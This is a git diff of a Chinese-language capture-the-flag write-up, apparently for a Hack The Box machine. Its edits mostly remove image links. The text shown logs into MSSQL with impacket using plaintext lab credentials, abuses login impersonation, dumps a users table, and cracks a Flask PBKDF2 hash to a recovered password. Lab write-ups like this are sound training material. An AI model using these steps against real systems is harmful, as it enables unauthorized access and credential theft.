@@ -69,7 +69,6 @@ Host script results:
 ```BASH
 impacket-mssqlclient 'eighteen.htb/kevin:iNa2we6haRj2gaw!@10.129.24.98'
 ```
-![[Pasted image 20251116204201.png]]
 **结果**：以 `guest` 身份连接，权限有限。
 #### 枚举登录
 
@@ -80,14 +79,12 @@ SELECT SYSTEM_USER, USER_NAME();
 -- 列出数据库
 SELECT name FROM master.dbo.sysdatabases;
 ```
-![[Pasted image 20251116204800.png]]
 #### 发现模拟权限
 
 ```SQL
 enum_impersonate
 ```
 
-![[Pasted image 20251116205249.png]]
 **关键发现**：Kevin 可以假冒 `appdev` 登录!
 #### 模拟 appdev 并访问数据库
 
@@ -104,19 +101,14 @@ USE financial_planner;
 -- 列出表格
 SELECT name FROM sys.tables;
 ```
-#### 找到的表格：
-
-![[Pasted image 20251116205908.png]]
 ### 提取用户凭证
 
 ```SQL
 SELECT * FROM users;
 ```
- ![[Pasted image 20251116210210.png]]
- 
 ### 破解密码哈希
 
-创建了一个 Python 脚本来破解 Flask PBKDF2 哈希:
+创建了一个 Python 脚本来破解 Flask PBKDF2 哈希：
 
 ```PYTHON
 #!/usr/bin/env python3
@@ -141,4 +133,5 @@ target_hash = "<REDACTED_HASH>"
 
 # Run against rockyou.txt with multiprocessing
 ```
-**破解密码:** iloveyou1
+
+**破解密码**：iloveyou1
